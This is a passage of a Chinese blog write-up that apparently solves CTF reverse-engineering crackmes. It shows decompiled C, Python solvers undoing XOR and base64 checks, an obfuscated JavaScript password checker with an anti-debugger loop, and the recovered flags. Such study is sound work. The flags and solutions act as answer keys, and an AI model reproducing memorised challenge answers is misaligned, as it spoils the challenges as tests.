class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中数组r是在运行时生成的，因此需要使用动态调试</p><p>大概的逻辑是：</p><ul><li>接收输入直到回车符</li><li>计算每个字符异或的结果</li><li>异或的结果是多少，就在数组中添加多少个1，然后添加一个0</li><li>对比两个数组的差异</li></ul><p>因此解密的逻辑就是</p><ol><li>拿到目标数组</li><li>遍历数组中1的个数，直到遇到数字0</li><li>将以上1的个数循环异或key的元素</li><li>转换为字符输出</li><li>重复2到4，直到遇到-1</li></ol><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">s = [...]</span><br><span class="line">ch = []</span><br><span class="line">key_index = <span class="number">0</span></span><br><span class="line">key = <span class="string">&#x27;SCNU&#x27;</span></span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">        c += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># print(hex(c), end=&#x27;&#x27;)</span></span><br><span class="line">        ch.append(<span class="built_in">chr</span>(c^<span class="built_in">ord</span>(key[key_index%<span class="number">4</span>])))</span><br><span class="line">        key_index += <span class="number">1</span></span><br><span class="line">        c = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>.join(ch))</span><br></pre></td></tr></table></figure><p><code>flag&#123;Winn3r_n0t_L0s3r_#&#125;</code></p><h2 id="eazy-64x"><a href="#eazy-64x" class="headerlink" title="eazy_64x"></a>eazy_64x</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+8h] [rbp-98h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-94h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+14h] [rbp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+1Ch] [rbp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> *v9; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> dest[<span class="number">4</span>]; <span class="comment">// [rsp+2Ch] [rbp-74h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+30h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x64</span>uLL);</span><br><span class="line">  __isoc99_scanf(&amp;unk_222C, s);</span><br><span class="line">  v7 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v7 == <span class="number">20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v7 / <span class="number">3</span> &gt;= v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memset</span>(dest, <span class="number">0</span>, <span class="keyword">sizeof</span>(dest));</span><br><span class="line">      <span class="built_in">memcpy</span>(dest, &amp;s[v5], <span class="number">3u</span>LL);</span><br><span class="line">      v9 = encrypt(dest);</span><br><span class="line">      v8 = <span class="built_in">strlen</span>(v9);</span><br><span class="line">      get_trans(v9);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v9[i] != glob[<span class="number">4</span> * v4 + i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Oh,no!&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">free</span>(v9);</span><br><span class="line">      ++v4;</span><br><span class="line">      v5 += <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Good!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sorry!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BYTE *__fastcall <span class="title">encrypt</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-6Ch]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+18h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v5; <span class="comment">// [rsp+20h] [rbp-60h]</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// [rsp+28h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">72</span>]; <span class="comment">// [rsp+30h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(v7, <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>);</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( v5 % <span class="number">3</span> )</span><br><span class="line">    v4 = <span class="number">4</span> * (v5 / <span class="number">3</span> + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v4 = <span class="number">4</span> * (v5 / <span class="number">3</span>);</span><br><span class="line">  v6 = <span class="built_in">malloc</span>(v4 + <span class="number">1</span>);</span><br><span class="line">  v6[v4] = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v2 &lt; v4 - <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6[v2] = v7[(<span class="keyword">unsigned</span> __int8)a1[v3] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    v6[v2 + <span class="number">1</span>] = v7[((<span class="keyword">unsigned</span> __int8)a1[v3 + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) | (<span class="number">16</span> * a1[v3]) &amp; <span class="string">&#x27;0&#x27;</span>];</span><br><span class="line">    v6[v2 + <span class="number">2</span>] = v7[((<span class="keyword">unsigned</span> __int8)a1[v3 + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>) | (<span class="number">4</span> * a1[v3 + <span class="number">1</span>]) &amp; <span class="number">0x3C</span>];</span><br><span class="line">    v6[v2 + <span class="number">3</span>] = v7[a1[v3 + <span class="number">2</span>] &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v3 += <span class="number">3</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 % <span class="number">3</span> == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6[v2 - <span class="number">2</span>] = <span class="number">61</span>;</span><br><span class="line">    v6[v2 - <span class="number">1</span>] = <span class="number">61</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v5 % <span class="number">3</span> == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6[v2 - <span class="number">1</span>] = <span class="number">61</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这里觉得是base64，也有可能是换表base64，但是解不出来，接着看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> __fastcall <span class="title">get_trans</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    a1[i] ^= <span class="number">0x68</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在类似base编码之后还加了异或</p><p>思路：</p><ul><li>异或还原</li><li>base64</li></ul><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = [<span class="number">0x32</span>, <span class="number">0x05</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x32</span>, <span class="number">0x5B</span>, <span class="number">0x1B</span>, <span class="number">0x10</span>, <span class="number">0x30</span>, <span class="number">0x5A</span>, <span class="number">0x1F</span>, <span class="number">0x1F</span>, <span class="number">0x0C</span>, <span class="number">0x05</span>, <span class="number">0x3E</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x05</span>, <span class="number">0x3E</span>, <span class="number">0x5A</span>, <span class="number">0x32</span>, <span class="number">0x3C</span>, <span class="number">0x21</span>, <span class="number">0x59</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0x58</span>, <span class="number">0x55</span>]</span><br><span class="line">ss = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    ss += <span class="built_in">chr</span>(i^<span class="number">0x68</span>)</span><br><span class="line">    </span><br><span class="line">print(base64.b64decode(ss))</span><br></pre></td></tr></table></figure><p><code>flag&#123;1_l0ve_reve25e&#125;</code></p><h2 id="JSNEWNEW"><a href="#JSNEWNEW" class="headerlink" title="JSNEWNEW"></a>JSNEWNEW</h2><p>一个html内嵌经过混淆的js代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((<span class="function">()=&gt;</span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>)</span>&#123;<span class="built_in">setInterval</span>(<span class="function">()=&gt;</span>&#123;(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span>![]&#125;[<span class="string">&#x27;constructor&#x27;</span>](<span class="string">&#x27;debugger&#x27;</span>)[<span class="string">&#x27;call&#x27;</span>]())&#125;,<span class="number">0x32</span>)&#125;<span class="keyword">try</span>&#123;_0x139d2b()&#125;<span class="function"><span class="title">catch</span>(<span class="params">_0x536807</span>)</span>&#123;&#125;&#125;)());<span class="function"><span class="keyword">function</span> <span class="title">_Y0u</span>(<span class="params">_0x5093c8,_0x291ad5</span>)</span>&#123;<span class="keyword">return</span> _0x5093c8+_0x291ad5&#125;<span class="function"><span class="keyword">function</span> <span class="title">_C4n</span>(<span class="params">_0x4277b8</span>)</span>&#123;<span class="keyword">return</span> _0x4277b8&amp;<span class="number">0xff</span>&#125;<span class="function"><span class="keyword">function</span> <span class="title">_N3v3r</span>(<span class="params">_0x414184,_0x29df09</span>)</span>&#123;<span class="keyword">return</span> _C4n(_0x414184^_0x29df09)&#125;<span class="function"><span class="keyword">function</span> <span class="title">_G37</span>(<span class="params">_0x500f65,_0x1ddb85</span>)</span>&#123;<span class="keyword">return</span> _C4n(_0x500f65|_0x1ddb85)&#125;<span class="function"><span class="keyword">function</span> <span class="title">_Th15</span>(<span class="params">_0x1621d6,_0x285fc7</span>)</span>&#123;<span class="keyword">return</span> _C4n(_0x1621d6&amp;_0x285fc7)&#125;<span class="function"><span class="keyword">function</span> <span class="title">_H4</span>(<span class="params">_0x2abb65</span>)</span>&#123;<span class="keyword">return</span> _C4n(~_0x2abb65)&#125;<span class="function"><span class="keyword">function</span> <span class="title">_H4H4</span>(<span class="params">_0x5b22bc</span>)</span>&#123;<span class="keyword">return</span> _C4n(_H4H4H4(_H4(_0x5b22bc),_H4H4H4([],<span class="number">0x1</span>)))&#125;<span class="function"><span class="keyword">function</span> <span class="title">_H4H4H4</span>(<span class="params">_0x431cb1,_0x516603</span>)</span>&#123;<span class="keyword">return</span> _C4n((_H4(_G37(_H4(_Y0u(_0x431cb1,_0x516603)),_H4(_Y0u(_0x431cb1,_0x516603)))),_H4(_G37(_H4(_Y0u(_0x431cb1,_0x516603)),_H4(_Y0u(_0x431cb1,_0x516603))))))&#125;<span class="function"><span class="keyword">function</span> <span class="title">_H4H4H4H4</span>(<span class="params">_0x1b81b8,_0x11e8ab,_0x2c730f</span>)</span>&#123;<span class="keyword">return</span> a=_H4H4H4(_0x1b81b8,_0x2c730f),a=_H4H4H4(a,_H4H4(_0x11e8ab)),a=_H4H4H4(a,_H4H4(_0x2c730f)),_C4n(a)&#125;<span class="function"><span class="keyword">function</span> <span class="title">_G00D</span>(<span class="params">_0x51eb06</span>)</span>&#123;((<span class="function">()=&gt;</span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>)</span>&#123;<span class="built_in">setInterval</span>(<span class="function">()=&gt;</span>&#123;(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span>![]&#125;[<span class="string">&#x27;constructor&#x27;</span>](<span class="string">&#x27;debugger&#x27;</span>)[<span class="string">&#x27;call&#x27;</span>]())&#125;,<span class="number">0x32</span>)&#125;<span class="keyword">try</span>&#123;_0x139d2b()&#125;<span class="function"><span class="title">catch</span>(<span class="params">_0x536807</span>)</span>&#123;&#125;&#125;)());<span class="keyword">var</span> _0x8b9e29=<span class="built_in">document</span>[<span class="string">&#x27;getElementById&#x27;</span>](<span class="string">&#x27;passwordError&#x27;</span>);_0xcaf3caf3=[],_0xc4f3c4f3=[<span class="number">0x55</span>,<span class="number">0xbf</span>,<span class="number">0x63</span>,<span class="number">0xbc</span>,<span class="number">0x33</span>,<span class="number">0x95</span>,<span class="number">0x31</span>,<span class="number">0x4c</span>,<span class="number">0x89</span>,<span class="number">0x6b</span>,<span class="number">0x49</span>,<span class="number">0x31</span>,<span class="number">0x30</span>,<span class="number">0xdf</span>,<span class="number">0x63</span>,<span class="number">0xe5</span>,<span class="number">0x57</span>,<span class="number">0xd7</span>,<span class="number">0x73</span>,<span class="number">0xa6</span>,<span class="number">0x6e</span>,<span class="number">0xd3</span>,<span class="number">0x63</span>,<span class="number">0xa1</span>,<span class="number">0x92</span>,<span class="number">0x5b</span>,<span class="number">0x72</span>,<span class="number">0xe6</span>,<span class="number">0x8f</span>,<span class="number">0x76</span>,<span class="number">0x4f</span>,<span class="number">0xd0</span>],Hur1k=<span class="string">&#x27;Hur1k&#x27;</span>;<span class="keyword">if</span>(_0x51eb06[<span class="string">&#x27;length&#x27;</span>]!=<span class="number">0x27</span>)<span class="keyword">return</span> _0x8b9e29[<span class="string">&#x27;textContent&#x27;</span>]=<span class="string">&#x27;错误的&#x27;</span>,![];<span class="keyword">if</span>(_0x51eb06[<span class="string">&#x27;substr&#x27;</span>](<span class="number">0x0</span>,<span class="number">0x6</span>)!=<span class="string">&#x27;XSCTF&#123;&#x27;</span>)<span class="keyword">return</span> _0x8b9e29[<span class="string">&#x27;textContent&#x27;</span>]=<span class="string">&#x27;错误的&#x27;</span>,![];<span class="keyword">if</span>(_0x51eb06[<span class="number">0x26</span>]!=<span class="string">&#x27;&#125;&#x27;</span>)<span class="keyword">return</span> _0x8b9e29[<span class="string">&#x27;textContent&#x27;</span>]=<span class="string">&#x27;错误的&#x27;</span>,![];_0x114514=_0x51eb06[<span class="string">&#x27;substr&#x27;</span>](<span class="number">0x6</span>,<span class="number">0x20</span>),_0x51eb06=[];<span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">var</span> _0x28db6c=<span class="number">0x0</span>;_0x28db6c&lt;_0x114514[<span class="string">&#x27;length&#x27;</span>];_0x28db6c++</span>)</span>&#123;_0x51eb06[<span class="string">&#x27;push&#x27;</span>](_0x114514[<span class="string">&#x27;charCodeAt&#x27;</span>](_0x28db6c))&#125;<span class="built_in">Math</span>[<span class="string">&#x27;seed&#x27;</span>]=<span class="keyword">new</span> <span class="built_in">Date</span>()[<span class="string">&#x27;getTime&#x27;</span>](),<span class="built_in">Math</span>[<span class="string">&#x27;seededRandom&#x27;</span>]=<span class="function"><span class="keyword">function</span>(<span class="params">_0x14b0c9,_0x56fb11</span>)</span>&#123;_0x56fb11=_0x56fb11||<span class="number">0x1</span>,_0x14b0c9=_0x14b0c9||<span class="number">0x0</span>,<span class="built_in">Math</span>[<span class="string">&#x27;seed&#x27;</span>]=(<span class="built_in">Math</span>[<span class="string">&#x27;seed&#x27;</span>]*<span class="number">0x2455</span>+<span class="number">0xc091</span>)%<span class="number">0x38f40</span>;<span class="keyword">var</span> _0xee8b23=<span class="built_in">Math</span>[<span class="string">&#x27;seed&#x27;</span>]/<span class="number">0x38f40</span>;<span class="keyword">return</span> <span class="built_in">parseInt</span>(_0x14b0c9+_0xee8b23*(_0x56fb11-_0x14b0c9))&#125;;<span class="keyword">var</span> _0xe5731c=<span class="built_in">Math</span>[<span class="string">&#x27;seededRandom&#x27;</span>](<span class="number">0x0</span>,<span class="number">0x100</span>);<span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">var</span> _0x28db6c=<span class="number">0x0</span>;_0x28db6c&lt;_0x51eb06[<span class="string">&#x27;length&#x27;</span>];_0x28db6c+=<span class="number">0x2</span></span>)</span>&#123;tmp=_H4H4H4(_0x51eb06[_0x28db6c],_0x28db6c)^_0x28db6c,_0xcaf3caf3[<span class="string">&#x27;push&#x27;</span>](tmp),randNum=<span class="built_in">Math</span>[<span class="string">&#x27;seededRandom&#x27;</span>](<span class="number">0x0</span>,<span class="number">0x100</span>),<span class="built_in">Math</span>[<span class="string">&#x27;seed&#x27;</span>]=randNum,tmp=_H4H4H4H4(tmp^_0x51eb06[_0x28db6c+<span class="number">0x1</span>],Hur1k[<span class="string">&#x27;charCodeAt&#x27;</span>]([_0x28db6c/<span class="number">0x2</span>%Hur1k[<span class="string">&#x27;length&#x27;</span>]]),randNum),_0xcaf3caf3[<span class="string">&#x27;push&#x27;</span>](tmp)&#125;((<span class="function">()=&gt;</span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>)</span>&#123;<span class="built_in">setInterval</span>(<span class="function">()=&gt;</span>&#123;(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span>![]&#125;[<span class="string">&#x27;constructor&#x27;</span>](<span class="string">&#x27;debugger&#x27;</span>)[<span class="string">&#x27;call&#x27;</span>]())&#125;,<span class="number">0x32</span>)&#125;<span class="keyword">try</span>&#123;_0x139d2b()&#125;<span class="function"><span class="title">catch</span>(<span class="params">_0x536807</span>)</span>&#123;&#125;&#125;)());<span class="keyword">if</span>(_0xcaf3caf3[<span class="string">&#x27;length&#x27;</span>]!=<span class="number">0x20</span>)<span class="keyword">return</span> _0x8b9e29[<span class="string">&#x27;textContent&#x27;</span>]=<span class="string">&#x27;究极错误的&#x27;</span>,![];<span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">var</span> _0x28db6c=<span class="number">0x0</span>;_0x28db6c&lt;_0xcaf3caf3[<span class="string">&#x27;length&#x27;</span>];_0x28db6c++</span>)</span>&#123;<span class="keyword">if</span>(_0xcaf3caf3[_0x28db6c]!=_0xc4f3c4f3[_0x28db6c])<span class="keyword">return</span> _0x8b9e29[<span class="string">&#x27;textContent&#x27;</span>]=<span class="string">&#x27;错误的&#x27;</span>,![]&#125;<span class="keyword">return</span>!![]&#125;</span><br></pre></td></tr></table></figure><p>首先经过<a href="https://obf-io.deobfuscate.io/">Obfuscator.io Deobfuscator (deobfuscate.io)</a>，初步解混淆<br>再通过<a href="https://deobfuscate.io/">JavaScript Deobfuscator (deobfuscate.io)</a>，再解一次<br>然后就解不动了（不排除有其他工具）</p><p>解混淆的结果</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;.constructor(<span class="string">&quot;debugger&quot;</span>).call());</span><br><span class="line">    &#125;, <span class="number">50</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    _0x139d2b();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (_0x536807) &#123;&#125;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_H4H4H4</span>(<span class="params">_0x431cb1, _0x516603</span>) </span>&#123;</span><br><span class="line">  ~((~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span> | ~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span>) &amp; <span class="number">255</span>) &amp; <span class="number">255</span>;</span><br><span class="line">  <span class="keyword">return</span> ~((~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span> | ~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span>) &amp; <span class="number">255</span>) &amp; <span class="number">255</span> &amp; <span class="number">255</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_H4H4H4H4</span>(<span class="params">_0x1b81b8, _0x11e8ab, _0x2c730f</span>) </span>&#123;</span><br><span class="line">  a = _H4H4H4(_0x1b81b8, _0x2c730f);</span><br><span class="line">  a = _H4H4H4(a, _H4H4H4(~_0x11e8ab &amp; <span class="number">255</span>, _H4H4H4([], <span class="number">1</span>)) &amp; <span class="number">255</span>);</span><br><span class="line">  a = _H4H4H4(a, _H4H4H4(~_0x2c730f &amp; <span class="number">255</span>, _H4H4H4([], <span class="number">1</span>)) &amp; <span class="number">255</span>);</span><br><span class="line">  <span class="keyword">return</span> a &amp; <span class="number">255</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_G00D</span>(<span class="params">_0x51eb06</span>) </span>&#123;</span><br><span class="line">  (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;.constructor(<span class="string">&quot;debugger&quot;</span>).call());</span><br><span class="line">      &#125;, <span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span 